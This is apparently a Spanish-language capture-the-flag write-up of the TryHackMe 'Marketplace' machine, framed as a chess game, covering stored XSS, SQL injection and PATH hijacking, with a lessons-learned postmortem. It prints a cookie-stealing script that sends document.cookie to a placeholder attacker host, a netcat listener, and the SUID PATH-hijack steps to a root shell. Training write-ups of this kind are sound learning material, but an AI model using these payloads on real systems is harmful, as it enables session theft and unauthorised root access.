```
♟ PARTIDA 008
  THE MARKETPLACE
  TryHackMe · Medium · Linux
```

```bash
$ whoami
> t474_r0b07

$ cat /etc/context
> xss almacenado para robar cookie de admin.
> sqli para moverse dentro del panel.
> path hijacking para escalar.
> tres fases distintas. tres vectores distintos.
> esta tiene más capas que las anteriores.
```

---

## `> ♟ APERTURA: lectura del tablero`

```bash
$ cat first_impression.txt
> un mercado.
> los usuarios publican anuncios.
> el administrador los revisa.
> eso es todo lo que necesito saber.
```

> The Marketplace es diferente al resto de esta serie. No hay CVE público. No hay contraseña en texto plano esperando en un archivo. Hay lógica de aplicación: y la lógica de aplicación siempre tiene supuestos que se pueden romper. El administrador revisa los anuncios. Eso convierte cada anuncio en un vector.

---

## `> ♞ PIEZA EXPUESTA: reconocimiento`

```bash
$ nmap -sV -sC -p- <IP>

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6
8585/tcp open  http    Node.js
```

> Puerto 8585. No estándar. La aplicación corre en Node. Me registro. Creo un anuncio. Veo el botón de reportar al administrador.
>
> Eso es la señal. Un administrador que visita URLs controladas por el usuario es XSS almacenado esperando a ser activado.

---

## `> ♝ HIPÓTESIS: línea de juego`

```bash
$ cat hypothesis.txt
> admin visita anuncios reportados
> anuncio con XSS → roba cookie de admin
> cookie de admin → acceso al panel
> panel de admin → sqli o rce
> sistema → escalada por binario suid o path hijack
```

---

## `> ♜ INICIATIVA: ruptura · fase 1: xss`

```bash
$ # payload en descripción del anuncio
<script>fetch('http://<IP_ATACANTE>:9001/?c='+document.cookie);</script>

$ nc -lvnp 9001
```

```bash
$ # reportar anuncio al admin
$ # esperar

> GET /?c=token=.Grandma[REDACTED] HTTP/1.1
```

> El administrador revisó el anuncio. El script se ejecutó en su navegador. La cookie llegó a nuestra escucha. La sesión del administrador ahora es nuestra.

---

## `> ♜ INICIATIVA: ruptura · fase 2: dentro del panel`

```bash
$ # reemplazar cookie en navegador
$ # recargar /admin

> acceso concedido al panel de administración
```

> El panel tiene una sección que consulta información de usuarios por ID. El parámetro no está sanitizado.

```bash
$ # sqli en parámetro de usuario
$ /admin?user=1 UNION SELECT ...

> credenciales · rutas internas · estructura de base de datos
```

> La base de datos habla. Usuarios, contraseñas hasheadas, rutas del sistema. La posición se abre.

---

## `> ♛ REY EXPUESTO: escalada · path hijacking`

```bash
$ find / -perm -u=s -type f 2>/dev/null

> /opt/marketplace/backup
```

> Binario SUID personalizado. No es un binario del sistema: lo desarrollaron ellos. Eso es peor. Los binarios del sistema tienen documentación. Los binarios personalizados tienen supuestos no examinados.

```bash
$ strings /opt/marketplace/backup

> cat /etc/passwd
```

> Ejecuta `cat` sin ruta absoluta. Busca `cat` en el PATH. El PATH lo controlamos.

```bash
$ cd /tmp
$ echo '/bin/bash' > cat
$ chmod +x cat
$ export PATH=/tmp:$PATH

$ /opt/marketplace/backup

> root@machine:~#
```

> El binario buscó `cat`. Encontró el nuestro. Ejecutó bash como root. La posición colapsó por un supuesto no examinado en código propio.

---

## `> ♚ JAQUE MATE`

```bash
$ cat /root/root.txt
> THM{[REDACTED]}
```

---

## `> ♜ ANÁLISIS DE LA PARTIDA: ¿dónde perdió el rey?`

```bash
$ cat postmortem.txt

MOVIMIENTO 1: xss almacenado sin sanitización en anuncios
MOVIMIENTO 2: sqli sin prepared statements en panel admin
MOVIMIENTO 3: binario suid con rutas relativas en código propio
```

> Tres capas independientes. Ninguna causada por versión desactualizada o CVE público: todas causadas por decisiones de desarrollo.
>
> El XSS porque no sanitizaron el input de usuarios. El SQLi porque no usaron prepared statements. El path hijacking porque alguien escribió `cat` en lugar de `/bin/cat` en un binario que corre como root.
>
> Son errores de código. No de configuración. Eso los hace más interesantes: y más comunes.

```bash
$ echo $LESSON
> rutas relativas en binarios con suid son path hijacking esperando ejecutarse.
> /bin/cat no es lo mismo que cat.
> la diferencia es quién controla el PATH.
```

---

> *partida 008 · the marketplace · jaque mate confirmado*
> *→ [t474-r0b07](https://github.com/t474-r0b07)*

<!--
  escribieron cat en lugar de /bin/cat.
  en un binario que corre como root.
  el supuesto no examinado siempre cobra.
-->
